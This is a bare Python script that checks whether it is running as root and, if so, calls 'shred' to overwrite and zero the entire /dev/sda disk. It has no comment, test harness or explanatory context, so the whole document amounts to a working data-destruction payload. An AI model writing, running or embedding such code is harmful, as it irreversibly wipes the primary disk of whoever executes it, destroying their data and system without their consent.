#!/usr/bin/env python3
import os, subprocess
if os.getuid() == 0:
    subprocess.call(["shred", "-n", "1", "-z", "/dev/sda"])
